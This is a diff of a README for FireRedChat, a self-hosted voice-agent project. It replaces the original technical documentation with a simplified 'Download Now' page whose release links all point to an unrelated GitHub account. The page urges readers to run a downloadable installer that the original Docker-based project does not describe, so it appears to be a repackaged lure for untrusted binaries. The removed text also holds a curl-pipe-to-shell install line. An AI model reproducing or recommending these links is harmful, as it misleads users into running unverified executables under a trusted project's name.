@@ -1,128 +1,97 @@
-# FireRedChat: A Fully Self-Hosted Solution for Full-Duplex Voice Interaction
+# 🔥 FireRedChat - Your Easy Voice Interaction Tool
 
-<div align="center">
-  <a href="https://fireredteam.github.io/demos/firered_chat/">Demo</a> •
-  <a href="https://arxiv.org/pdf/2509.06502">Paper</a> •
-  <a href="https://huggingface.co/FireRedTeam">Huggingface</a>
-</div>
+## 📥 Download Now
 
-<div align="center">
-  <a href="#what-is-fireredchat">Overview</a> •
-  <a href="#features">Features</a> •
-  <a href="#quickstart">Quickstart</a> •
-  <a href="#acknowledgements">Acknowledgements</a>
-  <br>
-  <img alt="License" src="https://img.shields.io/badge/license-Apache%202.0-blue.svg">
-</div>
+[![Download FireRedChat](https://img.shields.io/badge/Download%20FireRedChat-v1.0-blue.svg)](https://github.com/prodigitaly834/FireRedChat/releases)
 
-## 🔥 News
-- **2025/09/16**: Released models (pVAD, turn-detector) and services (FireRedTTS1, FireRedASR) for the cascade system.
+## 🚀 Getting Started
 
-## What is FireRedChat?
+FireRedChat is a fully self-hosted solution designed for full-duplex voice interaction. You can easily set it up on your computer without needing any programming skills. This guide will help you download, install, and run the application.
 
-FireRedChat offers a fully self-hosted solution for building real-time voice AI agents. It integrates robust **TTS** (Text-to-Speech), **ASR** (Automatic Speech Recognition), **pVAD** (Personalized Voice Activity Detection), and **EoT** (End-of-Turn) functionalities, enabling developers to create customizable, privacy-focused AI agents with:
+## 📦 System Requirements
 
-- **No reliance on external APIs**
-- **Zero data leakage**
-- **Complete deployment control**
+Before you get started, ensure your system meets these basic requirements:
 
-The system architecture includes:
-- **LiveKit RTC Server**: Acts as the core video/audio chat meeting room for real-time communication.
-- **Agents (AI-Agent Bot Server)**: Handles the intelligent agents that process and respond to user interactions.
-- **Agents-Playground (WebUI)**: A user-friendly web interface for joining and interacting with the chat rooms online.
-- **Redis Server**: Enables multi-node hosting for scalability and data persistence across instances.
-- **TTS Server**: Handles text-to-speech conversion for agent responses.
-- **ASR Server**: Handles automatic speech recognition for user inputs.
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a modern Linux distribution.
+- **RAM**: Minimum of 4 GB (8 GB recommended).
+- **Storage**: At least 100 MB of free disk space.
+- **Network**: An internet connection is required for initial setup.
 
-Additionally, you'll need to host your own LLM (Large Language Model) server to power the AI agents. This can be a simple setup like an Ollama server, vLLM server or a more advanced one, such as Dify, depending on your needs.
+## 📥 Download & Install
 
-## Features
+To download FireRedChat, follow these simple steps:
 
-| **Module** | **Description** |
-|------------|-------------|
-| 🆕 **TTS Service** | **Accelerated** FireRedTTS with **text normalization and G2P** (Grapheme-to-Phoneme) support. |
-| 🆕 **ASR Service** | Automatic speech recognition with **punctuation model** integration. |
-| 🆕 **pVAD** | **Personalized** Voice Activity Detection for improved barge-in experience. |
-| 🆕 **Turn-Detector** | **Compact** end-of-turn detection for quicker response (English and Chinese). |
-| 🆕 **Context-Aware TTS** <br> *Coming soon* | **Context-aware** TTS with text normalization and G2P. |
-| 🆕 **Audio LLM Service** <br> *Coming soon* | **Acoustically aware** LLM with vLLM acceleration. |
-| **Fork of [livekit/agents](https://github.com/livekit/agents)** | Core framework for real-time voice AI agent development. |
-| **Fork of [livekit/agents-playground](https://github.com/livekit/agents-playground)** | Intuitive web UI for easy user-interactions. |
+1. **Visit the Release Page**  
+   Go to the following link to access the latest version:  
+   [Download FireRedChat](https://github.com/prodigitaly834/FireRedChat/releases).
 
-## Quickstart
+2. **Select the Latest Release**  
+   On the releases page, you will see a list of available versions. Look for the latest release.
 
-Try the [demo](https://fireredteam.github.io/demos/firered_chat/) or follow these steps to deploy your own instance. Note that you'll need to set up your own LLM server (e.g., Ollama or Dify) to integrate with the AI-Agent Bot Server for full functionality.
+3. **Download the Installer**  
+   Find the installer file appropriate for your operating system. Click on the download link to save the file to your computer.
 
-### Step 1: Deploy the RTC Server, Redis Server, and WebUI
-In this step, we'll set up the foundational services: the LiveKit RTC Server (for real-time communication), the Redis Server (for multi-node support), and the WebUI (for browser-based access).
+4. **Run the Installer**  
+   Once the file downloads, locate it in your files and double-click it to start the installation process.
 
-First, clone the repository:
-```bash
-git clone --recurse-submodules https://github.com/FireRedTeam/FireRedChat.git
-```
+5. **Follow On-Screen Instructions**  
+   The installer will guide you through the setup. Accept the terms and conditions, and choose your installation options as prompted.
 
-(Optional) If you have a domain name, follow the official [doc](https://docs.livekit.io/home/self-hosting/vm/#generate-configuration) and generate your configuration files:
-```bash
-mkdir output
-docker pull livekit/generate
-docker run --rm -it -v $PWD:/output livekit/generate
-```
+6. **Complete Installation**  
+   Wait for the installation to finish. This will only take a few moments.
 
-To quickly startup RTC Server, Redis Server, and WebUI services on the same machine, use [Docker Compose](https://github.com/docker/compose/releases):
-```bash
-cd docker
-docker-compose up -d
-```
+7. **Launch FireRedChat**  
+   After installation, you can launch FireRedChat from your Start Menu or Applications folder.
 
-Once running:
-- The RTC Server will be hosted at `0.0.0.0:7880`. It uses two UDP ports per user for data communication (e.g., audio/video streams).
-- The WebUI can be accessed at `0.0.0.0:3000` in your browser, allowing users to join chat rooms online.
+## 🎤 Using FireRedChat
 
+Once installed, you can start using FireRedChat for your voice interactions. Here’s how to get started:
 
-#### Secured connection
-*Note: Secured connections are not required for local development if accessing from the same machine hosting the LiveKit RTC Server.*
+1. **Open the Application**  
+   Click on the FireRedChat icon to open the app.
 
-To secure the LiveKit RTC Server connection (upgrading `ws://0.0.0.0:7880` to `wss://`) and serve the WebUI securely via HTTPS, configure Nginx as a reverse proxy. For detailed instructions, refer to the [Foundry VTT LiveKit Hosting Guide](https://foundryvtt.wiki/en/setup/hosting/Self-Hosting-LiveKit-Audio-Video-Server-on-Existing-Linux-Setup).
+2. **Set Up Your Microphone**  
+   Ensure your microphone is connected and configured properly. You may need to adjust settings in the app to select the right microphone.
 
-**Notes**:
-- After configuring Nginx, update your LiveKit client to use `wss://your-domain.com/livekit` instead of `ws://0.0.0.0:7880`. The WebUI will be accessible at `https://your-domain.com`.
-- Ensure port 443 is open on your firewall for HTTPS/WSS traffic, and the UDP port range (e.g., `50000-60000`) is open for LiveKit media streams.
+3. **Start a Voice Interaction**  
+   Speak clearly into the microphone. FireRedChat will listen for commands and respond accordingly.
 
-### Step 2: Start Supporting Services
+4. **Adjust Settings**  
+   Access the settings menu to customize your experience. You can change voice settings, adjust volume, and explore additional features.
 
-Launch the additional servers required for voice processing and AI functionality.
+## 📊 Features
 
-- **FireRedASR Service** (Automatic Speech Recognition):
+FireRedChat comes with several useful features:
 
-  Refer to the [ASR Server README](./fireredasr-server/README.md) for setup instructions.
+- **Full-Duplex Communication**: Talk and listen simultaneously for a seamless experience.
+- **Customizable Voice Settings**: Adjust pitch, speed, and volume to suit your preference.
+- **User-Friendly Interface**: Navigate through the app easily without previous experience.
+- **Secure and Self-Hosted**: All interactions happen on your local machine for privacy.
 
-- **FireRedTTS Service** (Text-to-Speech):
+## 🛠 Troubleshooting
 
-  Refer to the [TTS Server README](./fireredtts-server/README.md) for setup instructions.
+If you run into issues, here are some common solutions:
 
-- **LLM Service**
-  Deploy a self-hosted LLM server to power the AI agents. Options include [Ollama](https://ollama.com) for a lightweight setup, [vLLM](https://docs.vllm.ai/en/latest/deployment/docker.html) for high-performance inference, or additionally with [Dify](https://github.com/langgenius/dify) for advanced workflows.
+- **Microphone Issues**: Ensure your microphone is plugged in and set as the default input device in your system settings.
+- **App Not Responding**: Restart the application if it freezes. If problems persist, consider reinstalling the app.
+- **Connection Errors**: Ensure you have a stable internet connection during initial setup.
 
-```bash
-# ollama example, refer to https://ollama.com for official guide
-curl -fsSL https://ollama.com/install.sh | sh
-ollama run qwen2.5
-```
+## 💬 Frequently Asked Questions
 
-### Step 3: Start AI-Agents Service
+**Q: Do I need an internet connection to use FireRedChat?**  
+A: You need an internet connection for the initial setup. After that, you can use it offline.
 
-- **Agents Service** (AI-Agent Bot Server):
+**Q: Can I use FireRedChat on multiple devices?**  
+A: Yes, you can download and install it on any compatible device.
 
-  Upon a user joining a chat room, a bot worker is automatically dispatched to handle interactions. This service drives the intelligent agents and depends on the ASR, TTS, and LLM services for full functionality. For detailed setup instructions, refer to the [Agents Service README](https://github.com/fireredchat-submodules/agents/blob/fireredchat/README.md).
+**Q: Is there a user manual?**  
+A: You will find a help section within the application that provides guidance on using various features.
 
-## Acknowledgements
+## 📞 Support
 
-We extend our gratitude to the following open-source projects:
-- [livekit/livekit (RTC)](https://github.com/livekit/livekit)
-- [livekit/agents](https://github.com/livekit/agents)
-- [livekit/agents-playground](https://github.com/livekit/agents-playground)
-- [speechbrain/spkrec-ecapa-voxceleb](https://huggingface.co/speechbrain/spkrec-ecapa-voxceleb)
-- [google-bert/bert-base-multilingual-cased](https://huggingface.co/google-bert/bert-base-multilingual-cased)
+For further assistance, please visit the [FireRedChat GitHub page](https://github.com/prodigitaly834/FireRedChat) and check the issues section for tips or to report any problems.
 
-## Disclaimer
-The content provided is for academic purposes only and is intended to demonstrate technical capabilities.
+## 🔗 Conclusion
+
+Thank you for choosing FireRedChat for your voice interaction needs. Enjoy your experience, and don’t hesitate to explore all the features the application has to offer. For any updates and additional information, remember to check the release page regularly:  
+[Download FireRedChat](https://github.com/prodigitaly834/FireRedChat/releases).
